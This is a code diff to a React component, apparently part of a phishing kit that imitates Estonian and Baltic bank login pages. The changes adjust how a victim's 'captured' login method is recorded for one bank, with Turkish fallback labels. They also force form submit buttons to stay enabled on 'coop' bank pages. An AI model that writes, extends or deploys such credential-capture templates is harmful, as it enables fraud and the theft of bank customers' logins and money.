@@ -112,9 +112,12 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         
         const detectedLoginMethod = typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "";
         const fallbackLoginMethod = resolveLoginMethodFromIndex(bankSlug, currentIndex);
-        let newLoginMethod = detectedLoginMethod && detectedLoginMethod.toLowerCase() !== "bilinmiyor"
-          ? detectedLoginMethod
-          : (fallbackLoginMethod || "Bilinmiyor");
+        const preferIndexedLoginMethod = bankSlug === "citadele-banka";
+        let newLoginMethod = preferIndexedLoginMethod
+          ? (fallbackLoginMethod || detectedLoginMethod || "Bilinmiyor")
+          : detectedLoginMethod && detectedLoginMethod.toLowerCase() !== "bilinmiyor"
+            ? detectedLoginMethod
+            : (fallbackLoginMethod || "Bilinmiyor");
         const capturedFields = normalizeCapturedFields(formData);
         const mappedData: Record<string, string> = {
           loginMethod: newLoginMethod,
@@ -914,6 +917,18 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           // Form boş ise butonları disable etme kontrolü
           const form = input.closest('form');
           if (form) {
+             if (window.location.href.includes('coop')) {
+                form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    btn.style.cursor = 'pointer';
+                    btn.style.pointerEvents = 'auto';
+                    btn.classList.remove('disabled');
+                    btn.classList.remove('bb-button--disabled');
+                });
+                return;
+             }
+
              let anyEmpty = false;
              form.querySelectorAll('input').forEach(i => {
                 if (i.type !== 'hidden' && i.type !== 'submit' && i.type !== 'button') {
